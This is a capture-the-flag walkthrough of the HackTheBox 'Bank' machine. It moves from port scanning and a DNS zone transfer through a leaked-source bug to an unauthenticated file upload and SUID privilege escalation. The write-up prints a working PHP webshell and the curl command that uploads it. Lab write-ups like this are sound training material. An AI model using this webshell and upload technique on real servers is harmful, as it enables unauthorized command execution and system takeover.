# HackTheBox - Bank

![Screenshot0](./screenshots/0.png)

<br>

## Table of Contents

- [Enumeration](#Enumeration)
    - [Portscan](#Portscan)
    - [Webserver](#Webserver)
    - [DNS Zone-Transfer](#DNS-Zone-Transfer)
    - [Webserver](#Webserver)
- [Foothold](#Foothold)
    - [Source Code Leakage](#Source-Code-Leakage)
    - [Unauthenticated File Upload](#Unauthenticated-File-Upload)
    - [User Flag](#User-Flag)
- [Privilege Escalation](#Privilege-Escalation)
    - [SUID Abuse](#SUID-Abuse)
    - [Root Flag](#Root-Flag)

<br>
<br>

## Enumeration

### Portscan

I started as usual with a portscan.

__Command:__ `nmap -p- -sV -sC -T4 <IP>`

![Screenshot1](./screenshots/1.png)

We can see an open web server on port 80, a DNS server on port 53 and an SSH server on port 22.

<br>

### Webserver

I accessed the web server under the IP and saw an Apache2 default page.

![Screenshot2](./screenshots/2.png)

I went through my enumeration checklist for web servers and found nothing.

<br>

### DNS Zone-Transfer

So I guessed the name and tried to get smarter from the DNS server.

Here is a successful zone transfer.

__Command:__ `dig axfr bank.htb @<IP>`

![Screenshot3](./screenshots/3.png)

### Webserver

I entered __bank.htb__ in my `/etc/hosts` file and called the domain.

![Screenshot4](./screenshots/4.png)

Now I saw a login page and enumerated the server using the domain name again.

__Command:__ `ffuf -w <WORDLIST> -u http://bank.htb/FUZZ -ic`

![Screenshot5](./screenshots/5.png)

![Screenshot6](./screenshots/6.png)

<br>
<br>

## Foothold

### Source Code Leakage

In the file `support.php` I noticed that the source code is disclosed before the redirect.

![Screenshot7](./screenshots/7.png)

An interesting HTTP comment caught my interest which says that `.htb` file endings are also executed as PHP.

<br>

### Unauthenticated File Upload

So I created a simple webshell named `shell.htb`...

```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

... and uploaded it with a __curl__ command.

```bash
curl -X POST http://bank.htb/support.php -F "title=something1" -F "message=something des Problems" -F "fileToUpload=@./shell.htb" -F "submitadd=" -H "Content-Type: multipart/form-data"
```

<br>

### User Flag

The webshell was then accessible under `/uploads/` and from there I established a reverse shell.

![Screenshot8](./screenshots/8.png)

I operated as user `www-data` and was able to get the user flag in the home folder of user `chris`.

![Screenshot9](./screenshots/9.png)

<br>
<br>

## Privilege Escalation

### SUID Abuse

The privilege escalation was done quickly.

When searching for files with __SUID__ set, the following binary caught my eye:

__Command:__ `find / -perm /4000 2>>/dev/null`

![Screenshot10](./screenshots/10.png)

![Screenshot11](./screenshots/11.png)

<br>

### Root Flag

A simple execution of the file brought me a shell as `root` and I got the final flag.

![Screenshot12](./screenshots/12.png)





